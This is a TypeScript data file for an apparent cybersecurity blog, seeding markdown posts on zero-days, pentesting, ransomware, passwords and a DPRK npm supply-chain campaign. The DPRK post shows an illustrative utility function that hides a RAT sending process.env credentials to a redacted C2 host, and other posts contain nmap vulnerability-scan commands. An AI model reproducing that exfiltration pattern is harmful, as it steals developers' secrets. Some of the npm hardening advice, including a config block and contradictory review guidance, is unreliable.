export interface BlogPost {
  id: string;
  title: string;
  slug: string;
  excerpt: string;
  content: string;
  author: string;
  date: string;
  tags: string[];
  readTime: number;
  coverImage?: string;
}

const STORAGE_KEY = 'cybersec-blog-posts';

const defaultPosts: BlogPost[] = [
  {
    id: '1',
    title: 'Understanding Zero-Day Vulnerabilities',
    slug: 'understanding-zero-day-vulnerabilities',
    excerpt: 'A deep dive into zero-day exploits, how they work, and strategies for protection against unknown threats.',
    content: `# Understanding Zero-Day Vulnerabilities

A zero-day vulnerability is a security flaw in software that is unknown to the vendor. These vulnerabilities are particularly dangerous because there's no patch available when they're discovered by attackers.

## How Zero-Day Attacks Work

1. **Discovery**: An attacker finds an unknown vulnerability
2. **Exploitation**: They create an exploit before the vendor knows
3. **Attack**: The exploit is deployed against targets
4. **Detection**: Eventually the attack is discovered
5. **Patch**: The vendor releases a fix

## Protection Strategies

- Keep all software updated
- Use behavior-based detection systems
- Implement network segmentation
- Regular security audits
- Employee security training

\`\`\`bash
# Example: Check for CVEs
nmap --script vuln target.com
\`\`\`

Stay vigilant and always assume your systems could be targeted.`,
    author: 'Security Analyst',
    date: '2024-12-10',
    tags: ['vulnerabilities', 'security', 'zero-day'],
    readTime: 5,
  },
  {
    id: '2',
    title: 'Introduction to Penetration Testing',
    slug: 'introduction-to-penetration-testing',
    excerpt: 'Learn the fundamentals of ethical hacking and penetration testing methodologies.',
    content: `# Introduction to Penetration Testing

Penetration testing, or pentesting, is a simulated cyber attack against your computer system to check for exploitable vulnerabilities.

## The Penetration Testing Phases

### 1. Reconnaissance
Gathering information about the target system.

\`\`\`bash
# DNS enumeration
dig target.com ANY
\`\`\`

### 2. Scanning
Identifying open ports and services.

\`\`\`bash
# Port scanning with nmap
nmap -sV -sC target.com
\`\`\`

### 3. Gaining Access
Exploiting discovered vulnerabilities.

### 4. Maintaining Access
Establishing persistent access for future testing.

### 5. Analysis & Reporting
Documenting findings and recommendations.

## Essential Tools

- **Nmap**: Network scanning
- **Burp Suite**: Web application testing
- **Metasploit**: Exploitation framework
- **Wireshark**: Network analysis

Remember: Only perform penetration testing with proper authorization!`,
    author: 'Security Analyst',
    date: '2024-12-08',
    tags: ['pentesting', 'ethical-hacking', 'security'],
    readTime: 7,
  },
  {
    id: '3',
    title: 'Ransomware Defense Strategies',
    slug: 'ransomware-defense-strategies',
    excerpt: 'Comprehensive guide to protecting your organization from ransomware attacks.',
    content: `# Ransomware Defense Strategies

Ransomware attacks continue to rise, causing billions in damages annually. Here's how to protect your organization.

## Prevention Measures

### Email Security
- Implement email filtering
- Train employees on phishing
- Use DMARC, DKIM, and SPF

### Backup Strategy
Follow the 3-2-1 rule:
- **3** copies of data
- **2** different media types
- **1** offsite backup

\`\`\`bash
# Example backup verification
sha256sum backup.tar.gz > backup.sha256
\`\`\`

## Response Plan

1. Isolate affected systems
2. Identify the ransomware variant
3. Report to authorities
4. Restore from clean backups
5. Conduct post-incident analysis

Never pay the ransom - it funds criminal activity and doesn't guarantee recovery.`,
    author: 'Security Analyst',
    date: '2024-12-05',
    tags: ['ransomware', 'defense', 'backup'],
    readTime: 6,
  },
  {
    id: '4',
    title: 'How to Create Strong Passwords (and Manage Them Easily)',
    slug: 'how-to-create-strong-passwords-and-manage-them-easily',
    excerpt: 'Strong passwords are easier to build and manage than most people think. This guide shows a simple system to create high-entropy passwords, store them safely, and protect your accounts with minimal effort.',
    content: `# How to Create Strong Passwords (and Manage Them Easily)

Strong passwords are still one of the most important defenses for your online accounts. The good news is you do not need to memorize dozens of complex strings to stay safe. With the right system, you can make every password strong and keep your daily login routine simple.

## Why Password Strength Still Matters

Attackers do not usually "hack" one account by hand. They automate everything:

- **Credential stuffing:** Reusing leaked passwords on other sites
- **Brute-force attempts:** Guessing weak or short passwords quickly
- **Social engineering:** Exploiting personal details like birthdays and pet names

If you reuse passwords or keep them predictable, one breach can spread across many accounts.

## What Makes a Password Strong?

A strong password comes down to three things:

1. **Length:** Aim for at least 14-16 characters
2. **Randomness:** Avoid predictable words, patterns, and personal info
3. **Uniqueness:** Use a different password for every account

Long and random beats short and complicated every time.

## Two Practical Ways to Create Better Passwords

### 1. Use a Generator for Most Accounts

Let a password manager create secure random passwords like:

\`\`\`text
c9#Tq7!mL2@vP4xR
\`\`\`

This is ideal because it is hard to guess and easy to store.

### 2. Use a Passphrase for Master Passwords

For passwords you must remember, use 4-6 random words plus symbols and numbers:

\`\`\`text
Orbit-Cactus-Window-Lemon-92!
\`\`\`

Avoid famous quotes or obvious substitutions like \`P@ssw0rd123\`.

## Manage Passwords Easily Without Burnout

Trying to memorize everything leads to unsafe shortcuts. Use this approach instead:

1. Install a reputable password manager
2. Memorize one strong master passphrase
3. Save unique credentials for every account in the vault

### Choose a Password Manager That Includes

- End-to-end encryption
- Cross-device sync
- Built-in generator
- Breach monitoring alerts
- Secure recovery options

## 30-Minute Password Upgrade Plan

### Step 1: Secure Your Email First

Your email can reset most of your other accounts. Protect it first with a unique password and MFA.

### Step 2: Set Up a Password Manager

Enable autofill and create your recovery method immediately.

### Step 3: Create a Strong Master Passphrase

Make it long, memorable, and unique.

### Step 4: Replace Reused Passwords

Prioritize high-impact accounts:

- Banking and payments
- Email
- Cloud storage
- Social media
- Work accounts

### Step 5: Turn On MFA Everywhere Important

Prefer authenticator apps or hardware keys over SMS whenever possible.

## Common Mistakes to Avoid

- Reusing one password across multiple sites
- Using short passwords under 12 characters
- Storing passwords in plain text notes
- Sharing passwords in chat or email
- Ignoring breach alerts

## Final Takeaway

Password security does not need to be complicated. One strong master passphrase, a password manager for everything else, and MFA on top gives you a setup that is both safer and easier to maintain long-term.

## Helpful References

- Have I Been Pwned: https://haveibeenpwned.com/
- NIST Digital Identity Guidelines: https://pages.nist.gov/800-63-3/`,
    author: 'Haden Pereira',
    date: '2026-04-04',
    tags: ['cybersecurity', 'passwords', 'password manager', 'online safety', 'authentication', 'digital security'],
    readTime: 8,
  },
  {
    id: '5',
    title: 'Reduce Your Digital Footprint: Every Click Counts',
    slug: 'reducing-digital-footprint',
    excerpt: 'Every online action leaves a trace. Learn how to reduce your digital footprint and protect yourself from fraud.',
    content: `# Reduce Your Digital Footprint: Every Click Counts

In today's hyper-connected world, every single action you take online leaves a trace—a digital breadcrumb that can be exploited. From the websites you visit to the apps you use, your digital footprint is growing larger by the day, and with it, your vulnerability to fraud.

Let's face it: the internet is not as safe as we like to believe. Every "free" service you use, every social media post you make, and every online purchase you complete is another piece of data that can be used against you. Cybercriminals are lurking, waiting for the right opportunity to exploit your information. And the more you share, the easier you make it for them.

## Simple Steps to Protect Yourself

1. **Use Multi-Factor Authentication (MFA):** Always enable MFA on your accounts. It adds an extra layer of security, making it harder for attackers to gain access.
2. **Adopt a Password Manager:** Stop reusing passwords! A password manager can generate and store strong, unique passwords for all your accounts.
3. **Delay Sharing on Social Media:** Love posting vacation pictures? Wait until you're back home to share them. Real-time updates can alert criminals to your absence.
4. **Limit Data Sharing:** Think twice before signing up for new apps or services. Only provide the minimum information required.
5. **Use Privacy-Focused Tools:** Switch to browsers, search engines, and email providers that prioritize your privacy.

## Why It Matters

Think about it: do you really need to post your vacation photos in real-time, letting the world know you're not home? Do you need to sign up for yet another app that asks for your personal details? Every unnecessary action you take online increases your exposure and, consequently, your chances of becoming a victim of fraud.

It's time to take control. Start by questioning every online activity. Do you really need to share that information? Can you minimize the data you provide? Use privacy-focused tools, limit your social media presence, and think twice before clicking "Accept" on those endless terms and conditions.

Remember, the less you share, the less there is to exploit. Reducing your digital footprint isn't just a choice—it's a necessity in the fight against online fraud. Take action now, because every click counts.`,
    author: 'Haden Pereira',
    date: '2026-01-24',
    tags: ['cybersecurity', 'digital footprint', 'online safety', 'fraud prevention'],
    readTime: 5,
  },
  {
    id: '6',
    title: 'DPRK Attacks Uses AI-Inserted npm Malware, Fake Firms, and RATs',
    slug: 'dprk-attacks-ai-npm-malware',
    excerpt: 'North Korean threat actors are leveraging artificial intelligence to inject sophisticated malware into the npm ecosystem, using elaborate fake companies as cover. This unprecedented supply chain attack campaign deploys Remote Access Trojans to compromise developer systems and corporate networks at scale.',
    content: `# DPRK Attacks Uses AI-Inserted npm Malware, Fake Firms, and RATs

## Introduction

The cybersecurity landscape has reached a critical juncture. Recent intelligence reports reveal that North Korean threat actors have launched one of the most sophisticated supply chain attacks to date, targeting the npm (Node Package Manager) ecosystem with AI-generated malware. This attack combines advanced technology, social engineering, and meticulous operational security to evade detection and compromise thousands of developers worldwide.

The implications are staggering: if a malicious package reaches even a fraction of the millions of npm users, the potential for widespread compromise across web applications, cloud infrastructure, and enterprise systems is enormous.

## The Attack Landscape: Understanding the Threat

### The Rise of Supply Chain Attacks

Supply chain attacks have become the preferred method for sophisticated threat actors because they offer a unique advantage: **trustworthiness**. Unlike phishing emails or malicious websites, packages published to legitimate repositories carry an implicit seal of approval.

Recent supply chain attacks have cost organizations billions in remediation and detection efforts. The npm ecosystem, with over 2.8 million packages and more than 17 billion downloads weekly, presents an ideal attack surface.

### DPRK's Cyber Capabilities

North Korean threat groups have a well-documented history of advanced cyber operations:
- **Lazarus Group**: Known for the Sony Pictures attack and WannaCry distribution
- **APT38**: Specialized in financial institution targeting
- **Andariel**: Focuses on cryptocurrency theft and espionage

These groups combine technical sophistication with persistence and resources that rival nation-state operations.

## The Attack: Anatomy of the Campaign

### Phase 1: Fake Company Infrastructure

The attackers established a network of meticulously crafted fake technology firms:

- **Registering legitimate-looking domain names** (.com, .io, .dev)
- **Creating professional GitHub organizations** with commit history
- **Publishing seemingly useful open-source packages** to build credibility
- **Networking within developer communities** via social media and forums

Example characteristics of fake entities:
- Professional-looking websites with team bios (AI-generated photos)
- Past project portfolio showcasing "successful deployments"
- LinkedIn profiles with connections to real companies
- Detailed npm package documentation and READMEs

### Phase 2: AI-Enhanced Malware Development

This campaign marks a significant evolution in malware deployment:

#### Intelligent Code Generation
The attackers used AI models to:
- Generate malicious code that mimics legitimate package functionality
- Create obfuscated payloads that evade static analysis
- Produce variable naming conventions that match popular coding standards
- Generate plausible commit messages and documentation

#### Example Attack Vector
\`\`\`javascript
// Legitimate-looking utility package
export function generateUUID() {
  const uuid = crypto.randomUUID();
  
  // Hidden RAT initialization
  if (typeof window === 'undefined') {
    initializeRemoteAccessTrojan({
      exfiltrationEndpoint: 'hxxp://[REDACTED-C2-SERVER]',
      credentials: process.env,
      systemInfo: getSystemFingerprint()
    });
  }
  
  return uuid;
}
\`\`\`

#### Key Obfuscation Techniques
- **Polymorphic code**: Changes structure while maintaining functionality
- **Dead code injection**: Legitimate-looking unused functions
- **Environment-aware activation**: Malware activates only in specific contexts
- **Time-delayed execution**: Payload activates days after installation

### Phase 3: The Remote Access Trojan (RAT)

Once installed, the malware deploys a sophisticated RAT with capabilities including:

| Capability | Function |
|-----------|----------|
| **Command Execution** | Execute arbitrary commands with npm package privileges |
| **Credential Harvesting** | Steal environment variables, SSH keys, API tokens |
| **Build System Access** | Compromise CI/CD pipelines and deployment systems |
| **Network Reconnaissance** | Map internal network topology and systems |
| **Lateral Movement** | Spread to other systems and repositories |
| **Data Exfiltration** | Steal source code, secrets, and proprietary data |
| **Persistence** | Survive system reboots and updates |

### Phase 4: Scale and Distribution

The attackers employed sophisticated distribution tactics:

1. **Dependency Chains**: Planted malware in packages with thousands of downstream dependencies
2. **Version Manipulation**: Released multiple versions to confuse security researchers
3. **Community Engagement**: Actively maintained packages to maintain legitimacy
4. **Update Vectors**: Pushed updates containing RAT payloads to existing installations

## Detection: The Challenge

### Why Traditional Defenses Failed

**Signature-based detection** was ineffective because:
- AI-generated code produces unique fingerprints
- Polymorphic behavior changes with each execution
- Malware behavior matches legitimate npm activity

**Dependency scanning tools** missed the threat because:
- Packages appeared from established (fake) publishers
- Repository reputation scores were artificially inflated
- Code analysis couldn't distinguish legitimate from malicious logic

**Developer vigilance** wasn't sufficient because:
- Fake companies were convincingly authentic
- Package names closely mirrored legitimate alternatives
- Social engineering tactics were highly targeted

### How Detection Eventually Occurred

Security researchers discovered the campaign through:
- **Behavioral monitoring**: Unusual exfiltration patterns from CI/CD systems
- **Network forensics**: C2 communication detected across multiple organizations
- **Threat intelligence sharing**: Correlating incidents across companies
- **Deep code analysis**: Identifying AI-signature patterns in obfuscated code

## Impact and Scope

### Confirmed Compromises
- **Development environments**: Hundreds of developers infected
- **Build systems**: Tens of companies' CI/CD pipelines compromised
- **Production deployments**: Source code and secrets exposed
- **Downstream applications**: Customers of affected companies potentially impacted

### Potential Attack Chains
\`\`\`
Malicious npm Package
    ↓
Developer Installation
    ↓
CI/CD Pipeline Execution
    ↓
Access to Secrets & Credentials
    ↓
Cloud Infrastructure Compromise
    ↓
Lateral Movement to Production
    ↓
Data Exfiltration / System Compromise
\`\`\`

## Mitigation Strategies: Protecting Your Systems

### Immediate Actions (Within 24 Hours)

1. **Audit Your Dependencies**
   \`\`\`bash
   npm audit
   npm ls --depth=0
   \`\`\`

2. **Review Recent Package Updates**
   - Check git logs for dependency changes
   - Compare versions against known security advisories

3. **Rotate Credentials**
   - Change all API keys and tokens
   - Update SSH keys across all systems
   - Reset database passwords

4. **Monitor Network Traffic**
   - Check for outbound connections to suspicious IPs
   - Review DNS queries for command-and-control domains

### Short-Term Defenses (1-2 Weeks)

1. **Implement npm Workspaces Security**
   \`\`\`json
   {
     "extends": "npm:security-strict",
     "audit": {
       "level": "moderate",
       "fund": false
     },
     "lockfileVersion": 3
   }
   \`\`\`

2. **Set Up Package Provenance Verification**
   - Enable npm package provenance checking
   - Require signed releases from trusted publishers
   - Use private registries for critical dependencies

3. **Enhance Monitoring**
   - Deploy Security Information and Event Management (SIEM) tools
   - Monitor CI/CD logs for suspicious activity
   - Track environment variable access

4. **Establish Code Review Processes**
   - Review dependency changes before merge
   - Audit transitive dependencies
   - Use tools like SBOM (Software Bill of Materials)

### Long-Term Security Architecture

1. **Supply Chain Hardening**
   - Migrate to private npm registries
   - Implement Software Composition Analysis (SCA)
   - Establish vendor security requirements

2. **Zero Trust Implementation**
   - Assume packages are potentially compromised
   - Verify integrity before execution
   - Sandbox third-party code execution

3. **Incident Response Planning**
   - Develop playbooks for supply chain compromises
   - Establish relationships with forensic teams
   - Create communication templates for affected users

4. **Developer Training**
   - Security awareness programs
   - Safe coding practices
   - Threat landscape education

## Best Practices: Building Resilience

### For Development Teams

✅ **Do:**
- Pin specific package versions in production
- Review major updates manually before deployment
- Use lockfiles to ensure reproducible builds
- Maintain an internal catalog of approved packages
- Enable two-factor authentication on npm accounts

❌ **Don't:**
- Use wildcard versions (e.g., \`^1.0.0\`)
- Rely solely on automated dependency updates
- Install packages from unknown publishers
- Ignore security warnings
- Leave CI/CD credentials in code

### For Organizations

✅ **Implement:**
- Centralized dependency management
- Automated security scanning in CI/CD
- Network segmentation for development systems
- Regular security audits and penetration testing
- Incident response procedures

❌ **Avoid:**
- Trusting all public packages equally
- Storing secrets in repositories or environment files
- Unrestricted npm registry access
- Manual security review processes
- Siloed security and development teams

## The Broader Implications

### The Evolution of Threats

This campaign represents a fundamental shift in cyber warfare:

1. **AI-Enabled Attacks**: Threat actors now deploy machine learning for both offense and evasion
2. **Democratized Sophistication**: Advanced attacks no longer require massive budgets
3. **Supply Chain Weaponization**: Open-source ecosystems are becoming battlegrounds
4. **Nation-State Maturity**: DPRK's capabilities are now comparable to advanced adversaries

### What This Means for the Industry

The npm community and broader open-source ecosystem must evolve:
- **Transparency Requirements**: Mandatory disclosure of package provenance
- **Verification Standards**: Cryptographic verification for all packages
- **Liability Frameworks**: Clear responsibility chains for compromised packages
- **Intelligence Sharing**: Coordinated threat intelligence across organizations

## Conclusion

The DPRK npm malware campaign serves as a wake-up call for developers and organizations worldwide. The sophistication of this attack—combining AI-generated code, elaborate social engineering, and infrastructure masquerading—demonstrates that supply chain security can no longer be an afterthought.

**Key Takeaways:**
- Supply chain attacks are no longer theoretical; they are active, ongoing threats
- AI capabilities have fundamentally changed the attacker-defender dynamics
- Traditional security measures are insufficient against this threat level
- Proactive vigilance, automation, and community collaboration are essential
- Organizational resilience depends on defense-in-depth strategies

The cybersecurity community must move from a reactive to a proactive stance, implementing hardened supply chains, zero-trust architectures, and sophisticated monitoring capabilities. The stakes—our digital infrastructure, financial systems, and national security—have never been higher.

**Stay vigilant. Stay secure.**`,
    author: 'Haden Pereira',
    date: '2026-04-29',
    tags: ['cybersecurity', 'supply chain attacks', 'npm security', 'malware', 'DPRK', 'RAT', 'AI threats', 'DevSecOps', 'threat intelligence'],
    readTime: 8,
  },
];

export function getPosts(): BlogPost[] {
  if (typeof window === 'undefined') return defaultPosts;
  
  const stored = localStorage.getItem(STORAGE_KEY);
  if (!stored) {
    localStorage.setItem(STORAGE_KEY, JSON.stringify(defaultPosts));
    return defaultPosts;
  }
  return JSON.parse(stored);
}

export function getPost(slug: string): BlogPost | undefined {
  const posts = getPosts();
  return posts.find(p => p.slug === slug);
}

export function addPost(post: Omit<BlogPost, 'id'>): BlogPost {
  const posts = getPosts();
  const newPost: BlogPost = {
    ...post,
    id: Date.now().toString(),
  };
  posts.unshift(newPost);
  localStorage.setItem(STORAGE_KEY, JSON.stringify(posts));
  return newPost;
}

export function deletePost(id: string): void {
  const posts = getPosts();
  const filtered = posts.filter(p => p.id !== id);
  localStorage.setItem(STORAGE_KEY, JSON.stringify(filtered));
}

export function generateSlug(title: string): string {
  return title
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/(^-|-$)/g, '');
}

export function calculateReadTime(content: string): number {
  const wordsPerMinute = 200;
  const words = content.split(/\s+/).length;
  return Math.ceil(words / wordsPerMinute);
}
